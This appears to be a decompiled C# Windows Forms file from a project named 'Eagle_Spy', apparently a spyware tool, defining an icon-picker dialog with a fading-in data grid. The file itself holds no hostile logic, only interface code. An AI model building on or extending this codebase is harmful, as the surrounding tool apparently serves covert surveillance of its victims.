using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class Icons : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	public int id;

	internal DataGridView DGV0
	;

	internal Timer TOpacity
	;

	[field: AccessedThroughProperty("Column1")]
	internal DataGridViewImageColumn Column1
        ;

    [field: AccessedThroughProperty("Column2")]
	internal DataGridViewTextBoxColumn Column2
	

        ;

        [field: AccessedThroughProperty("Column3")]
	internal DataGridViewTextBoxColumn Column3
        ;
    [field: AccessedThroughProperty("Column4")]
	internal DataGridViewTextBoxColumn Column4
        ;

    public Icons()
	{
		base.Load += Icons_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewImageColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		base.SuspendLayout();



        DGV0.SortCompare += new DataGridViewSortCompareEventHandler(DGV0_SortCompare);
        DGV0.CellDoubleClick += new DataGridViewCellEventHandler(DGV0_CellDoubleClick);
        DGV0.CellContentClick += new DataGridViewCellEventHandler(DGV0_CellContentClick);
        TOpacity.Tick += new EventHandler(TOpacity_Tick);




        this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.Black;
		this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV0.Columns.AddRange(this.Column1, this.Column2, this.Column3, this.Column4);
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(0, 120, 215);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV0.Location = new System.Drawing.Point(0, 0);
		this.DGV0.Name = "DGV0";
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(388, 334);
		this.DGV0.TabIndex = 5;
		this.Column1.FillWeight = 24f;
		this.Column1.HeaderText = "icon";
		this.Column1.Name = "Column1";
		this.Column1.Width = 34;
		this.Column2.HeaderText = "name";
		this.Column2.Name = "Column2";
		this.Column2.Width = 61;
		this.Column3.HeaderText = "sizes (px)\t";
		this.Column3.Name = "Column3";
		this.Column3.Width = 84;
		this.Column4.HeaderText = "size";
		this.Column4.Name = "Column4";
		this.Column4.Width = 53;
		this.TOpacity.Interval = 1;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(388, 334);
		base.Controls.Add(this.DGV0);
		base.Name = "Icons";
		base.Opacity = 0.0;
		base.ShowInTaskbar = false;
		this.Text = "Icons";
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		base.ResumeLayout(false);
	}

	private void SpyStyle()
	{
		foreach (DataGridView item in base.Controls.OfType<DataGridView>())
		{
			item.BackgroundColor = SpySettings.DefaultColor_Background;
			item.BackColor = SpySettings.DefaultColor_Background;
			item.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
			item.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
			item.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background;
			item.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
			item.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground;
			item.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
			item.Columns[0].DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Background;
		}
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	private void Icons_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\4.ico");
		SpyStyle();
		DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		DGV0.DefaultCellStyle.Font = reso.f;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	private void DGV0_SortCompare(object sender, DataGridViewSortCompareEventArgs e)
	{
		if (e.RowIndex1 == 0)
			e.Handled = true;
	}

	private void DGV0_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex >= 0 && e.ColumnIndex >= 0)
		{
			id = e.RowIndex;
			base.DialogResult = DialogResult.OK;
		}
	}

	private void DGV0_CellContentClick(object sender, DataGridViewCellEventArgs e)
	{
	}
}
